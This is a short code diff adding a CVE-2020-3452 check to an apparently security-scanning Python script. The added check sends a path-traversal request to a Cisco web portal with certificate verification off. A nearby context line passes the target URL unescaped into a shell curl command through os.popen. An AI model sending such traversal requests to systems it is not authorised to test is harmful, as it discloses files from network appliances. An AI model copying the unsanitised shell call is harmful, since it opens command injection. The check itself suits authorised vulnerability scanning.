@@ -1,9 +1,23 @@
 import sys
 import os
+import requests 
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from termcolor import colored
 
 
 def cves_check(url,port_num):
+    print(colored("Scanning for CVE-2020-3452 Path Traversal Vulnerability " ,"green"))
+    hearders = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'}
+    response = requests.get("https://" + url + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../", headers=hearders, verify=False)
+    if response.status_code == 200:
+        if "cisco" in response.content.__str__().lower():
+            print(colored("\tMight Vulnerable to Cisco Read-Only Path Traversal Vulnerability (CVE-2020-3452)\n\t Tried with: " + url ,"red"))
+            if "setsessiondata" in response.content.__str__().lower(): 
+                print(colored("Rechecking responses: HOST VULNERRABLE\n","red"))
+    else:
+        print(colored("\tNot Vulnerable\n" ,"green"))
+
     print(colored("Scanning For Options Bleed. ", "green"))
     cmd = "curl -sI -X OPTIONS https://" + url + ":" + port_num
     res = os.popen(cmd)
